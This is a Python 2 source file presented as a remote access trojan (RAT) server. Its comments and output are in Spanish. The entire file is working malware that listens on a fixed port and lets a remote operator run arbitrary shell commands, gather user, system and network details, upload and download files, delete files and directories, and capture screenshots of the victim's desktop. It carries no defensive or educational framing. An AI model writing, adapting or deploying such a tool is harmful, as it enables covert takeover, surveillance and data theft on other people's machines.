#!/usr/bin/env python
# -*- coding: utf-8 -*-

#RAT server by Pablo Rubio

import socket
from socket import error
import threading
import os
import platform
from subprocess import Popen
from subprocess import PIPE
import gtk.gdk
 
ip = "0.0.0.0"
port = 45456
max_conections = 5
array= []
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def admin(socket_client):

	request = socket_client.recv(1024)
	response = ''
	array = request.split(" ")
	print "[*] Mensaje recibido: %s" % array[0]

	if 'list' in array[0]:
		response = "[*] Directorio actual --> " + Popen('pwd', shell=True, stdout=PIPE).stdout.read()
		response += Popen('ls', shell=True, stdout=PIPE).stdout.read()

	elif 'info' in array[0]:
		response = "[*] Sys_Info 	-->	" + Popen('uname -a', shell=True, stdout=PIPE).stdout.read()
		response += "[*] User 	-->	" + Popen('whoami', shell=True, stdout=PIPE).stdout.read()
		response += "[*] Path 	-->	" + Popen('pwd', shell=True, stdout=PIPE).stdout.read()
		osInfo = platform.uname()
		response += "[*] Pc name	-->	" + str(osInfo[1])       
		response += "[*] Net_Info 	-->	" + Popen('ifconfig', shell=True, stdout=PIPE).stdout.read()

	elif 'cd' in array[0]:
		if os.path.isdir(array[1]):
            		os.chdir(array[1])
            		response = "[*] Directorio actual --> " + array[1]
                else:
			response = "[_] Directorio erroneo."

	elif 'shell' in array[0]:
		command = ''
		for i in array:
			if not 'shell' in i:
				command += i + ' '
		response = "[*] " + Popen(command, shell=True, stdout=PIPE).stdout.read()

	elif 'up' in array[0]:
		path = array[1].split("/")
		name = path[-1] 
		f = open(name, "wb")
		socket_client.send("go")		
	    	print "[*] Receiving..."
    		l = socket_client.recv(1024)
    		while (True):
        		print "[*] Receiving..."
        		f.write(l)
        		l = socket_client.recv(1024)
			if (len(l) < 1024):
				break
    		f.close()
    		print "[*] Archivo recibido."
    		socket_client.send('[*] Server --> Archivo recibido.')
		print("[*] El archivo se ha recibido correctamente.")
		response = "[*] Server --> Data OK."
		
	elif 'down' in array[0]:
		f = open(array[1],'rb')
		print '[*] Sending...'
		l = f.read(1024)
		while (l):
   			socket_client.send(l)
   			l = f.read(1024)
		f.close()
		print "[*] Archivo enviado."
		socket_client.shutdown(socket.SHUT_WR)
		print socket_client.recv(1024)
		socket_client.close         
    		print("[*] El archivo ha sido enviado correctamente.")
				
	elif 'close' in array[0]:
		print "[_] Cerrando conexion."
		server.close()	
		socket_client.close()
		exit(0)	

	elif 'delete' in array[0]:
		if os.path.isfile(array[1]):
			os.remove(array[1])
			response = '[*] Archivo borrado exitosamente.'
		elif os.path.isdir(array[1]):
			os.rmdir(array[1])
			response = '[*] Directorio borrado exitosamente.'
		else:
			response = '[-] No se ha podido borrar el archivo/directorio' 

	elif 'screenshot' in array[0]:
		w = gtk.gdk.get_default_root_window()
		sz = w.get_size()
		print "[*] The size of the window is %d x %d" % sz
		pb = gtk.gdk.Pixbuf(gtk.gdk.COLORSPACE_RGB,False,8,sz[0],sz[1])
		pb = pb.get_from_drawable(w,w.get_colormap(),0,0,0,0,sz[0],sz[1])
		if (pb != None):
		    	pb.save("screenshot.png","png")
			response = "[*] Screenshot saved to screenshot.png. (Download it from server¡¡¡)"
			print response
		else:
		    	response = "[-] Unable to get the screenshot."
			print response
		
		

	socket_client.send(response)
	socket_client.close()
	print ''

def main():
	server.bind((ip, port))
	server.listen(max_conections)
	print "[*] Esperando conexiones en %s:%d" % (ip, port)
 
	while(True):
		client, direction = server.accept()
		print "[*] Conexion establecida con %s:%d" % (direction[0], direction[1])
		rat = threading.Thread(target=admin, args=(client,))
		rat.start()


if __name__ == '__main__':

	os.system('clear')
	print "*************************"
	print "RAT Server by Pablo Rubio"
	print "*************************"
	print''
	main()
